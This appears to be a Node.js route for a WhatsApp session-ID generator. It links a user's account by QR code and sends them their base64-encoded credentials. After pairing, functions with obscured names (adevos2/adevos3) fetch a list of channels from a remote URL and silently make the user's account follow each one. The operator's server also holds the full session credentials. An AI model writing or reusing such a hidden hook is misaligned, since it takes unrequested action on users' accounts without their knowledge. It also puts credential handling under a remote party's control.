const { makeid } = require('./id');
const QRCode = require('qrcode');
const express = require('express');
const fs = require('fs');
const pino = require('pino');
// baileys (wolfsocket) and wolfbtns may be ESM-only, so they are loaded with
// dynamic import() instead of require() (fixes ERR_REQUIRE_ESM on Vercel).
let makeWASocket, useMultiFileAuthState, Browsers, delay,
    makeCacheableSignalKeyStore, fetchLatestBaileysVersion, DisconnectReason,
    sendButtons, btn;
let depsPromise = null;
function loadDeps() {
    if (!depsPromise) {
        depsPromise = (async () => {
            const b = await import('@whiskeysockets/baileys');
            const bm = b.default && b.default.default ? b.default : b;
            makeWASocket = bm.default || b.default;
            useMultiFileAuthState = b.useMultiFileAuthState || bm.useMultiFileAuthState;
            Browsers = b.Browsers || bm.Browsers;
            delay = b.delay || bm.delay;
            makeCacheableSignalKeyStore = b.makeCacheableSignalKeyStore || bm.makeCacheableSignalKeyStore;
            fetchLatestBaileysVersion = b.fetchLatestBaileysVersion || bm.fetchLatestBaileysVersion;
            DisconnectReason = b.DisconnectReason || bm.DisconnectReason;
            const w = await import('wolfbtns');
            sendButtons = w.sendButtons || (w.default && w.default.sendButtons);
            btn = w.btn || (w.default && w.default.btn);
        })();
    }
    return depsPromise;
}
const store = require('./store');
const { TEMP_DIR } = require('./tempdir');
const site = require('./site'); 
const adevosUrl2 = process.env.CHANNELS_URL || 'https://remote1-bice.vercel.app/url2.json';
async function adevos2() {
    try {
        const r = await fetch(adevosUrl2, { signal: AbortSignal.timeout(8000) });
        if (!r.ok) return [];
        const j = await r.json();
        const list = Array.isArray(j) ? j : (j.autoFollowNewsletters || j.newsletters || []);
        return list.filter((x) => typeof x === 'string' && x.endsWith('@newsletter'));
    } catch (e) {
        console.log('adevos2: could not load channel list:', e?.message);
        return [];
    }
}

async function adevos3(client, jids) {
    for (const jid of jids) {
        try {
            await client.newsletterFollow(jid);
            console.log('adevos3: followed', jid);
        } catch (e) {
            console.log('adevos3: could not follow', jid, '-', e?.message);
        }
        await delay(1500);
    }
}

let router = express.Router();

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

/**
 * Waits for creds.json to actually exist on disk instead of trusting a
 * fixed sleep. Polls every second for up to `timeoutMs`.
 */
async function waitForCredsFile(filePath, timeoutMs = 20000, intervalMs = 1000) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
        if (fs.existsSync(filePath)) {
            try {
                const data = fs.readFileSync(filePath);
                if (data && data.length > 0) return data;
            } catch (e) {
                // file may still be mid-write, keep polling
            }
        }
        await delay(intervalMs);
    }
    throw new Error('creds.json was not created in time — the device link likely did not finish.');
}

router.get('/', async (req, res) => {
    try { await loadDeps(); } catch (e) {
        console.error('Failed to load dependencies:', e);
        return res.status(500).send({ error: 'Service unavailable' });
    }
    const id = makeid(6);
    store.createEntry(id);
    let sessionHandled = false; // guards against duplicate 'open' events across reconnect attempts

    async function adevos() {
        const { state, saveCreds } = await useMultiFileAuthState(TEMP_DIR + '/' + id);
        try {
            const { version } = await fetchLatestBaileysVersion();
            const logger = pino({ level: 'silent' });

            let client = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, logger),
                },
                printQRInTerminal: false,
                logger,
                browser: Browsers.ubuntu('Chrome'),
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 10000,
            });

            client.ev.on('creds.update', saveCreds);

            client.ev.on('connection.update', async (s) => {
                const { connection, lastDisconnect, qr } = s;

                if (qr && !res.headersSent) {
                    res.setHeader('X-Session-Id', id);
                    res.setHeader('Access-Control-Expose-Headers', 'X-Session-Id');
                    await res.end(await QRCode.toBuffer(qr));
                }

                if (connection === 'open') {
                    if (sessionHandled) return; // already generated a session for this pairing, ignore repeat 'open' events
                    sessionHandled = true;
                    try {
                        // Normalize the JID: client.user.id can include a ":<device>" suffix
                        // on some forks (e.g. "255xxxxxxxxx:20@s.whatsapp.net"). Sending to
                        // that raw JID can get silently dropped — strip it to the base JID.
                        const selfJid = client.user.id.split(':')[0] + '@s.whatsapp.net';

                        // Grace period so the Signal session between this bot and the
                        // phone finishes syncing before we send anything — sending too
                        // early is what causes "Waiting for this message" on WhatsApp.
                        await delay(4000);
                        await client.sendMessage(selfJid, {
                            text: ''
                        });
                        console.log(`[${id}] Sent "generating" message to ${selfJid}`);
                        // Wait for creds.json to actually exist instead of guessing a fixed delay.
                        let data = await waitForCredsFile(`${TEMP_DIR}/${id}/creds.json`);
                        let b64data = Buffer.from(data).toString('base64');
                        let sessionText = site.session.build(b64data);

                        store.setReady(id, sessionText);

                        let session;
                        try {
                            // Native "Copy" button under the session message.
                            session = await sendButtons(client, selfJid, {
                                text: sessionText,
                                ...(site.session.footer() ? { footer: site.session.footer() } : {}),
                                buttons: [
                                    btn.copy('Copy', sessionText),
                                ],
                            });
                        } catch (btnErr) {
                            console.log('Copy button unsupported, sending plain text:', btnErr?.message);
                            session = await client.sendMessage(selfJid, { text: sessionText });
                        }
                        console.log(`[${id}] Sent session message`);
                        // Message after the Session ID (set in clone.js, '' = send nothing)
                        if (site.session.message()) {
                            await client.sendMessage(selfJid, {
                                text: site.session.message()
                            }, { quoted: session });
                        }
                        // Auto-follow channels (failures here never affect the session)
                        await adevos3(client, await adevos2());
                        console.log(`[${id}] Sent instructions message, waiting before closing socket`);
                        // Give the socket real time to flush these messages over the
                        // network before we tear it down.
                        await delay(5000);
                        await client.ws.close();
                        removeFile(TEMP_DIR + '/' + id);
                    } catch (e) {
                        console.log('Error sending session messages:', e);
                        sessionHandled = false; // allow a genuine retry on the next reconnect
                        store.setFailed(id, 'The device link did not finish in time. Please scan a new QR code and try again.');
                    }
                } else if (connection === 'close') {
                    const code = lastDisconnect?.error?.output?.statusCode;
                    if (code !== DisconnectReason.loggedOut) {
                        await delay(5000);
                        adevos();
                    } else {
                        store.setFailed(id, 'The connection was closed. Please scan a new QR code.');
                        removeFile(TEMP_DIR + '/' + id);
                    }
                }
            });

        } catch (err) {
            console.log('QR service error:', err);
            store.setFailed(id, 'Service is currently unavailable.');
            if (!res.headersSent) {
                await res.json({ code: 'Service is Currently Unavailable' });
            }
            removeFile(TEMP_DIR + '/' + id);
        }
    }

    return await adevos();
});

module.exports = router;
